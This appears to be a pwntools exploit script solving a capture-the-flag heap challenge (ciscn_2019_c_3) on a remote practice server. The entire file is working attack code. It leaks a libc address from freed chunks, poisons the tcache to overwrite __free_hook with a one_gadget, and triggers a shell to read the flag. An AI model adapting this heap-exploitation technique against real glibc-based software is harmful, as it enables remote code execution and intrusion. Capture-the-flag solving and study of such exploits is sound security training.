from pwn import *


# p = process('./ciscn_2019_c_3')
p = remote('node4.buuoj.cn', 26544)
elf = ELF('./ciscn_2019_c_3')
lib = elf.libc


def choice(id_):
    p.recvuntil(b'Command:')
    p.sendline(id_)


def add(size_, mess):
    choice(b'1')
    p.recvuntil(b'size:')
    p.sendline(str(int(size_)).encode())
    p.recvuntil(b'Give me the name:')
    p.sendline(mess)


def show(id_):
    choice(b'2')
    p.recvuntil(b'index:')
    p.sendline(id_)


def delete(id_):
    choice(b'3')
    p.recvuntil(b'weapon:')
    p.sendline(id_)


add(0x100, b'aaaa')
add(0x4f, b'aaa')   # 1
[delete(b'0') for i in range(8)]
show(b'0')
p.recvuntil(b'attack_times: ')
malloc_hook = int(p.recvuntil(b'\n')[: -1]) - 96 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
key = [0x4f2c5, 0x4f322, 0x10a38c]
ogg = base_addr + key[1]
free_hook = base_addr + lib.sym['__free_hook']
print(hex(base_addr))

add(0x4f, b'aaa')   # 2
add(0x4f, b'aaa')   # 3
delete(b'3')
payload = p64(0) * 9 + p64(0x61) + p64(free_hook - 0x10)
add(0x100, payload)  # 4
add(0x4f, b'aaa')   # 5
add(0x4f, p64(ogg))   # 6
delete(b'1')
p.sendline(b'cat flag')
# gdb.attach(p)
p.interactive()
